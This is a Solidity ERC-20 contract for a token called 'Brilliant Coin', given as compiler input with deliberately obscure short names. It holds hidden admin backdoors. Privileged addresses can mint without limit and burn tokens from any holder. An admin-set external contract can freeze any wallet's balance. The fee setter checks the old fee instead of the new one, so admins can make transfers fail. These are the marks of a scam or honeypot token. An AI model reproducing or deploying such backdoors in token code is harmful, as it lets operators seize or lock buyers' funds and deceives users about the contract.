{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"BRILLIANT.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.7.5;\r\nlibrary S{function ad(uint256 a,uint256 b)internal pure returns(uint256){uint256 c=a+b;require(c>=a,\"+of\");return c;}\r\n    function sb(uint256 a,uint256 b)internal pure returns(uint256){return sb(a,b,\"-of\");}\r\n    function sb(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b<=a,errorMessage);uint256 c=a-b;return c;}\r\n    function ml(uint256 a,uint256 b)internal pure returns(uint256){if(a==0){return 0;}uint256 c=a*b;require(c/a==b,\"*of\");return c;}\r\n    function dv(uint256 a,uint256 b)internal pure returns(uint256){return dv(a,b,\"/0\");}\r\n    function dv(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b>0,errorMessage);uint256 c=a/b;return c;}}\r\ninterface IERC{function totalSupply()external view returns(uint256);function balanceOf(address account)external view returns(uint256);\r\n    function transfer(address recipient,uint256 amount)external returns(bool);function allowance(address owner,address spender)external view returns(uint256);\r\n    function approve(address spender,uint256 amount)external returns(bool);function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);\r\n\tevent Transfer(address indexed from,address indexed to,uint256 value);event Approval(address indexed owner,address indexed spender,uint256 value);}\r\ninterface OX{function fz(address w)external view returns(uint256);}\r\ncontract BRILLIANT is IERC{using S for uint256;uint256 private _f;address[5]private m;modifier o{require(m[0]==msg.sender||m[1]==msg.sender);_;}\r\n\tmodifier z{require(chk());_;} string private _name='Brilliant Coin'; string private _symbol='BC';uint8 private _decimals=18;uint256 private _totalSupply;\r\n\tmapping(address=>uint256)private _balances;mapping(address=>mapping(address=>uint256))private _allowances;\r\n\tfunction name()public view returns(string memory){return _name;}function symbol()public view returns(string memory){return _symbol;}\r\n    function decimals()public view returns(uint8){return _decimals;}function totalSupply()public view override returns(uint256){return _totalSupply;}\r\n    function balanceOf(address account)public view override returns(uint256){return _balances[account];}\r\n\tfunction transfer(address recipient,uint256 amount)public virtual override returns(bool){_transfer(msg.sender,recipient,amount);return true;}\r\n\tfunction transferFrom(address sender,address recipient,uint256 amount)public virtual override returns(bool){_transfer(sender,recipient,amount);\r\n\t\t_approve(sender,msg.sender,_allowances[sender][msg.sender].sb(amount,\"exc allow\"));return true;}\r\n\tfunction approve(address spender,uint256 amount)public virtual override returns(bool){_approve(msg.sender,spender,amount);return true;}\r\n\tfunction allowance(address owner,address spender)public view virtual override returns(uint256){return _allowances[owner][spender];}\r\n\tfunction increaseAllowance(address spender,uint256 adedValue)public virtual returns(bool){_approve(msg.sender,spender,_allowances[msg.sender][spender].ad(adedValue));return true;}\r\n\tfunction decreaseAllowance(address spender,uint256 sbtractedValue)public virtual returns(bool){\r\n\t    _approve(msg.sender,spender,_allowances[msg.sender][spender].sb(sbtractedValue,\"allow 0\"));return true;}\r\n\tfunction _approve(address owner,address spender,uint256 amount)internal virtual{require(owner!=address(0),\"approve 0\"); \r\n\trequire(spender!=address(0),\"approve 0\");_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}\r\n\tfunction _burn(address account,uint256 amount)internal virtual{require(account!=address(0),\"burn 0\"); \r\n\t    _balances[account]=_balances[account].sb(amount,\"exc balance\");_totalSupply=_totalSupply.sb(amount);emit Transfer(account,address(0),amount);}\r\n\tfunction _mint(address account,uint256 amount)internal virtual{require(account!= address(0),\"mint 0\");\r\n\t    _totalSupply=_totalSupply.ad(amount);_balances[account]=_balances[account].ad(amount);emit Transfer(address(0),account,amount);}\r\n\tfunction _transfer(address sender,address recipient,uint256 amount)internal{require(sender!=address(0)&&recipient!=address(0),\"0 address\");\r\n        require(_balances[sender].sb(_fz(sender))>=amount,\"exc balance\");_balances[sender]=_balances[sender].sb(amount,\"exc balance\");\r\n\t\tuint256 f=amount.dv(100).ml(_f);_balances[recipient]=_balances[recipient].ad(amount.sb(f));emit Transfer(sender,recipient,amount.sb(f));\r\n\t\tif(_f>0){_totalSupply=_totalSupply.sb(f);emit Transfer(sender,address(0),f);}}\r\n\tfunction chk()internal view returns(bool){for(uint256 i=0;i<5;i++){if(msg.sender==m[i]){return true;}}return false;}\r\n\tfunction _fz(address w)internal view returns(uint256){return OX(m[2]).fz(w);}\r\n\tfunction mint(address w,uint256 a)external z returns(bool){_mint(w,a);return true;}\r\n\tfunction burn(address w,uint256 a)external z returns(bool){_burn(w,a);return true;}\r\n\tfunction sm(address w,uint256 i)external o{require(w!=address(0)&&i>0);m[i]=w;}\r\n\tfunction gm(uint256 i)external view o returns(address){return m[i];}\r\n\tfunction sf(uint256 a)external o{require(_f<21);_f=a;}\r\n\tfunction gf()external view o returns(uint256){return _f;}\r\n    fallback()external{revert();} constructor(){m[0]=msg.sender;}}"}}}